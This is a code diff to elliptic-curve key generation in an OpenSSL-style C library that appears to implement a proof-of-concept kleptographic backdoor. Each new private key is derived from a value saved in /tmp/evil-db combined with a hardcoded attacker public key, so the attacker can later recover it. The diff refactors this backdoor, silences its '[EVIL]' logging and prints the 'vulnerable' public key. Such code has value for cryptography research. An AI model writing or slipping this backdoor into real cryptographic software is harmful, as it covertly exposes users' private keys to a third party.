@@ -241,7 +241,8 @@ BIGNUM* _H(BIGNUM* x){
 
     BIGNUM* ret = BN_new();
     // take first c2size bytes from hash
-    if(!BN_bin2bn(hash, c2size, ret)) _perror("_H(x)");
+    if(!BN_bin2bn(hash, c2size, ret)) 
+        _perror("_H(x)");
 
     return ret;
 }
@@ -264,9 +265,9 @@ void _print_bn(BIGNUM* bn, char* name){
 }
 
 void _print(char *msg){
-    int verbose = 1;
+    int verbose = 0;
     if(verbose)
-        printf("[EVIL] %s", msg);
+        printf("[EVIL] %s\n", msg);
 }
 
 int ec_key_simple_generate_key(EC_KEY *eckey)
@@ -308,7 +309,8 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
         // file exists, use algo 2
         _print("algo 2\n");
         FILE *fr = fopen("/tmp/evil-db", "r");
-        if(!fr) _perror("ec_key_simple_generate_key: fr==NULL");
+        if(!fr) 
+            _perror("fr==NULL");
 
         // a,b,h,e
         BIGNUM* params[4];
@@ -321,12 +323,9 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
         params[3] = BN_new();
         BN_hex2bn(&params[3], "1114344294863AF852984EEB366E37088D36A302A6D748A5B5E12695D28E9A73");
 
-        // attacker's private key
-        // normally here should be the public key, but it is too hard to 
-        // deserialize it from the encoded in bytes X,Y,Z
-        // we don't care because this is PoC
-        BIGNUM* v = BN_new();
-        BN_hex2bn(&v, "0146D483EC3C80F59A4B6BC1243A5CC6275E50CD2FC4B60B2A8DD0032741F1A6");
+        // attacker's public key
+        EC_POINT* V = EC_POINT_hex2point(eckey->group, "04F4983E32A1850EFEDE77805CC4D2199E8EDAD74B56386786BCE1C1F838277EFD61E6D0DCCBE5DF686F2F426D72422F289B01781A31D26C410DC12854B402B67C", NULL, ctx);
+        
         // we don't need fresh key
         BN_free(priv_key);
         priv_key = _load_bn(fr); // c1
@@ -334,100 +333,88 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
         if(fr) fclose(fr);
 
         // algo 2:
-
         // STEP 1: Z = a c1 G + b c1 V + h j G + e u V
-        // Z = Q2 + W2 + E2 + R2
         srand(time(NULL));
         int j = rand() % 2, u = rand() % 2;
+        const int points_total = 4;
+        const EC_POINT* points[points_total];
 
-        EC_POINT* Z = EC_POINT_new(eckey->group);
-        EC_POINT* W2 = EC_POINT_new(eckey->group);
-        EC_POINT* Q2 = EC_POINT_new(eckey->group);
-        EC_POINT* E2 = EC_POINT_new(eckey->group);
-        EC_POINT* R2 = EC_POINT_new(eckey->group);
+        { // 0: a * c1 * G
+            points[0]  = EC_POINT_new(eckey->group);
+            if(!EC_POINT_copy(points[0], pub_key)) 
+                _perror("points[0]=pub_key");
+            if(!EC_POINT_mul(eckey->group, points[0], priv_key, NULL, NULL, ctx)) 
+                _perror("points[0]*=priv_key");
+            if(!EC_POINT_mul(eckey->group, points[0], params[0], NULL, NULL, ctx)) 
+                _perror("points[0]*=priv_key");
+        }
+        { // 1: b * c1 * V
+            points[1]  = EC_POINT_new(eckey->group);
+            if(!EC_POINT_copy(points[1], V)) 
+                _perror("points[1]=V");
+            if(!EC_POINT_mul(eckey->group, points[1], priv_key, NULL, NULL, ctx)) 
+                _perror("points[1]*=priv_key");
+            if(!EC_POINT_mul(eckey->group, points[1], params[1], NULL, NULL, ctx)) 
+                _perror("points[1]*=priv_key");
+        }
+        { // 2: h*j*G
+            points[2]  = EC_POINT_new(eckey->group);
+            if(!EC_POINT_copy(points[2], pub_key)) 
+                _perror("points[2]=V");
+            if(j == 1) {
+                if(!EC_POINT_mul(eckey->group, points[2], params[2], NULL, NULL, ctx)) 
+                    _perror("points[2]*=h");
+            } else {
+                EC_POINT_set_to_infinity(eckey->group, points[2]); // G + infinity = G
+            }
+        }
+        { // 3: e*u*V
+            points[3]  = EC_POINT_new(eckey->group);
+            if(!EC_POINT_copy(points[3], V)) 
+                _perror("points[3]=V");
+            if(u == 1) {
+                if(!EC_POINT_mul(eckey->group, points[3], params[3], NULL, NULL, ctx)) 
+                    _perror("points[3]*=e");
+            } else {
+                EC_POINT_set_to_infinity(eckey->group, points[3]); // G + infinity = G
+            }
+        }
+
+        EC_POINT* Z = points[0];
+        for(int i=1; i<points_total; i++){
+            if(!EC_POINT_add(eckey->group, points[0], points[0], points[i], ctx)) 
+                _perror("points[3]*=e");
+        }
         
-        // generator
-        EC_POINT *G = pub_key; // save reference to pub_key point
-
-        // V = vG -- attacker's public key
-        EC_POINT *V = EC_POINT_new(eckey->group);
-        if(!EC_POINT_copy(V, G)) _perror("V=G");
-
-        EC_POINT_mul(eckey->group, V, v, NULL, NULL, ctx);
-        
-        {
-            // Q1 = c1 * G
-            if(!EC_POINT_copy(Q2, G)) _perror("Q2=G");
-            EC_POINT_mul(eckey->group, Q2, priv_key, NULL, NULL, ctx);
-            // Q2 = a * Q1
-            EC_POINT_mul(eckey->group, Q2, params[0], NULL, NULL, ctx);
-            // Z = 0 here
-        }
-
-        {
-            // W1 = c1 * V
-            if(!EC_POINT_copy(W2, V)) _perror("W2=V");
-            EC_POINT_mul(eckey->group, W2, priv_key, NULL, NULL, ctx);
-            // W2 = b * W1
-            EC_POINT_mul(eckey->group, W2, params[1], NULL, NULL, ctx);
-            // Z = Q2 + W2
-            if(!EC_POINT_add(eckey->group, Z, Q2, W2, ctx)) _perror("Z=Q2+W2");
-            // Z = Q2 + W2
-        }
-
-        if(j == 1){
-            // E2 = h * G
-            if(!EC_POINT_copy(E2, G)) _perror("E2=V");
-            EC_POINT_mul(eckey->group, E2, params[2], NULL, NULL, ctx);
-            // Z += E2
-            if(!EC_POINT_add(eckey->group, Z, Z, E2, ctx)) _perror("Z=Z+E2");
-            // Z = Q2 + W2 + E2 
-        }
-
-        if(u == 1){
-            // R2 = e * V
-            if(!EC_POINT_copy(R2, V)) _perror("R2=V");
-            EC_POINT_mul(eckey->group, R2, params[3], NULL, NULL, ctx);
-            // Z += R2
-            if(!EC_POINT_add(eckey->group, Z, Z, R2, ctx)) _perror("Z=Z+R2");
-            // Z = Q2 + W2 + E2 + R2
-        }
-
         // STEP 2: H(Z)
-        _print_bn(priv_key, "priv_key before hashing");
         BN_free(priv_key);
         priv_key = _H(Z->X);
-        _print_bn(priv_key, "priv_key after hashing");
 
         // STEP 3: store c2
         FILE *fw = fopen("/tmp/evil-db", "w"); // it's ok that we remove previous db
-        if(!fw) _perror("can't open /tmp/evil-db");
-        
+        if(!fw) 
+            _perror("can't open /tmp/evil-db");
         // save c2
         _dump_bn(fw, priv_key);
+        if(fw) fclose(fw);
 
         // STEP 4: output M=c2*G 
         // at this step priv_key = c2
 
         // clean up
-        EC_POINT_free(Z);
-        EC_POINT_free(W2);
-        EC_POINT_free(Q2);
-        EC_POINT_free(E2);
-        EC_POINT_free(R2);
-
-        BN_free(v);
-
-        if(fw) fclose(fw);
+        EC_POINT_free(V);
+        for(int i=0; i<points_total; i++){
+            EC_POINT_free(points[i]);
+        }
     }
     else{
         // file dosn't exits, use algo 1
         _print("algo 1\n");
         FILE* fw = fopen("/tmp/evil-db", "w");
-        if(!fw) _perror("can't open /tmp/evil-db");
+        if(!fw) 
+            _perror("can't open /tmp/evil-db");
 
         // write: c1
-        _print_bn(priv_key, "priv_key");
         _dump_bn(fw, priv_key);
 
         if(fw) fclose(fw);
@@ -435,7 +422,9 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
 
     if (!EC_POINT_mul(eckey->group, pub_key, priv_key, NULL, NULL, ctx))
         goto err;
-
+    _print("Vulnerable public key:");
+    _print(EC_POINT_point2hex(eckey->group, pub_key, POINT_CONVERSION_UNCOMPRESSED, ctx));
+    
     eckey->priv_key = priv_key;
     eckey->pub_key = pub_key;
 
